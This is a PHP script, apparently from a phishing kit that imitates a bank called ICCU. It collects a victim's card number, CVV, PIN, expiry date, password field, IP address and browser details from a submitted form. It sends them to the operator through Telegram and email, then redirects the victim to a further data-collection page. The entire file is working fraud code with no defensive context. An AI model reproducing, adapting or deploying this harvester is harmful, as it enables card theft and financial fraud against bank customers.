<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	$browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");

    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $cn = $_POST['cn'];
    $cvv = $_POST['cvv'];
    $pin = $_POST['pin'];
    $exp = $_POST['exp'];
    $email = $_POST['email'];
    $serv = $_REQUEST['card'];


    $sender_name = "EM6L3M";
    $uid = "sender";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**ICCU**bank_INFO\n";
        $message .= "User-!P : ".$ip."\n";
        $message .= "----------------------------------------\n";
        $message .= "CARD: ".$_POST['cn']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CVV: ".$_POST['cvv']."\n";
        $message .= "----------------------------------------\n";
        $message .= "PIN: ".$_POST['pin']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EXP: ".$_POST['exp']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);


        //Main Content
        $main_subject = "LOGIN INFO l $ip";
        $main_body = "
	    PassWord : $email <p>
	    
        User-Ip : $ip";
        

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
        header("location:address.html");
?>
